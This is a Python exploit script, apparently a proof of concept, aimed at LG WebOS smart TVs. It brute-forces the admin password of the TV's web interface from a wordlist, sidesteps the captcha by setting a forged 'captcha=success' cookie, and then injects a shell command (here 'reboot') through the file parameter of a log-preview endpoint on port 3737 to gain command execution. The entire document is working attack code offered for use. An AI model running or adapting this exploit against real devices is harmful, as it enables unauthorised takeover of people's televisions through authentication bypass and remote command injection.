#!/usr/bin/env python
import requests, sys

#multiple vulnerabilites have been discovered within the LG Web OS smart TVs. 
#with physical access to the TV, you can enable Soft AP mode which broadcasts a network from the TV. This allows you full access to the TV via network without removing it from the previous network

#https://192.168.49.1/login
#https://10.42.0.236/login 


def admin_crack(_passwd):
	#the authentication form on the web interface is protected by a captcha
	#setting a cookie of captcha=success bypasses the cookie, enabling the pin to be cracked on
	url = "https://"+sys.argv[1]+"/login"
	cookies = {'captcha': 'success'}
	data = {'password': _passwd}
	# print(data)\
	session = requests.Session()
	session.verify = False
	requests.packages.urllib3.disable_warnings()
	r = session.post(url, cookies=cookies, data=data)
	# print(r.text)
	if r.text != "fail": #skip over failures
		print("[+] Admin Password: " + _passwd)
		return session


	return False

def get_root(authed_session):
	#exploits a remote code execution vulnerability in the log file preview
	url = "https://"+sys.argv[1]+":3737/logFile?file=log00000.txt;reboot&filter="
	r = authed_session.get(url)
	#print("[+] Check for your shell now")
	print ("[+] The device should be rebooting now.")


of = open("words.txt") #password list
for word in of.readlines():
	# print(word.strip())
	didwecrackit = admin_crack(word.strip())
	if didwecrackit:
		# break
		get_root(didwecrackit) #pass an authenticated session to the content management port
of.close()
	
